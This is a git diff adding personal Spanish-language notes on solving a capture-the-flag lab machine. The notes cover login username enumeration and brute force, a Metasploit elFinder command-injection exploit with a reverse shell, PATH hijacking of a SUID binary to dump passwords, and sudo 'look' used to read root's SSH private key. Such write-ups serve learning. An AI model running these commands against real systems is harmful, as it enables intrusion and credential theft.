@@ -1,0 +1,84 @@
+uso de archivo python login_brute.py para descubir usuarios validos
+mensajes de intentos de login
+
+mensaje1: wrong username or password
+mensaje2: wrong password < indica que el usuario es correcto pero la contra no
+
+usando login_brute.py como herramienta que busca el login mas una wordlist de usuarios y una contra x. 
+usuario1: admin
+usuario2: jose
+
+login en jose
+contra: password123
+
+dominio: file.lookup.thm
+archivo credential.txt
+think : nopassword < en el archivo no se escribio la contra del usuario
+
+metasploit reverseshell
+programa con vulnerbaildiad: Elfinder
+metasploit: use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
+set RHOSTS files.lookup.thm
+set LHOST ip_mia
+
+despues de conseguir el login en la maquina como el usuario www-data ejecute el siguiente comando en busca de usuario
+cat /etc/passwd
+usuario: think < previamente lo habia encontrado en un archivo de la pagina
+cd /home/think
+ls -la
+encontre un archivo .passwords al cual no tenia acceso, el archivo es leible por programas instalados por una persona, programas binarios o eso entendi
+
+find / -perm /4000 2>/dev/null
+el archivo que no se crea al instalar ubutu es:
+
+/usr/sbin/pwm
+
+el cual al ejecutarlo me pedia un id, en el articulo que lei decia que el archvio se ejecutaba con el nombre del su que en este caso es think, para conseguir esto cree un archvio usando el id 
+del usuario www-data que era 33 solo cambiando el nombre a think para enganar a la maquina y creyera que yo era el su y me diera acceso al archivo.
+comandos ejecutados:
+id
+resultado: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+cree un archivo id en la carpeta tmp donde tenia permiso el usuario www-data con lo siguiente
+-#!/bin/bash < sin la diagonal esta - obviamnete
+echo "uid=33(think) gid=33(think) groups=33(think)"
+./id < para asegurarme que se guardo correctamente 
+
+despues de crear el archivo toco modificar la PATH donde busca el programa el id para asi de esta manera enganar a la maquina haciendome pasar por otro usuario con los siguientes comandos:
+echo $PATH < para revisar como era la estructura
+resultado: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+echo $PATH
+salida del path modificado:
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+con esto ya hecho ejecute de nuevo el archivo /usr/sbin/pwm aqunque no era necesario escribir toda la ruta del archivo solo bastaba con el nombre pwm.
+el ejecutar el archvio me dio todas las contrasenas de el archivo contras.txt que la use como wordlist para hacer bruteforce con metasploit al usuario think resultando que la contrasena es
+
+usuario: think
+contra: josemario.AKA(think)
+
+con estas credenciales intene conectarme por shell y lo logre, lo unico que quedaba lograr era sacar el acceso a root.
+ejecucion de comandos:
+
+sudo -l
+
+al ejecutar ese comando encontre que tenia permiso se sudo para look, que es un programa con el cual puede hacer leer archvios del root sin iniciar sesion en el
+comando:
+
+LFILE=file_to_read
+sudo look '' "$LFILE"
+
+con este comando podia conseguir la flag de root.txt sin inicar sesion pero tambien podia conseguir su llave rsa para inicar sesion directamente como root y esto se hacia de la sguinete manera
+
+sudo /usr/bin/look '' /root/.ssh/id_rsa
+
+la cual copie y despues guarde en mi pc con el nombre rsa_root y modifique los permiso del archivo en mi pc para poder conectarme al servidor ssh sin problemas
+
+chmod 700 rsa_root
+
+ssh 10.10.172.3 -i rsa_root root@lookup.thm
+
+y con esto consegui el login directamnete en root y con esto consegui terminar la maquina 
+
